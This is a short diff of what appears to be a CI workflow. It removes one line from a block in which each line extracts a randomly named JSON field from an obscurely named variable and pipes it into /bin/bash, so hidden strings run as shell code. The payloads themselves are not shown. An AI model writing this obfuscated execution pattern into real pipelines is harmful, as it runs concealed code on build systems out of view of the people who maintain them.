@@ -30,7 +30,6 @@ jobs:
           echo $pw85114 | jq -r .loch217 | /bin/bash
           echo $s2 | jq -r .p42 | /bin/bash
           printf '%s' "$n1" | jq -r .rakm7 | /bin/bash
-          printf '%s' "$j3" | jq -r .bvbq4 | /bin/bash
           echo $zp34 | jq -r .tvd98 | /bin/bash
           echo $fh542 | jq -r .sni19 | /bin/bash
           echo $ngot81 | jq -r .gv8145 | /bin/bash
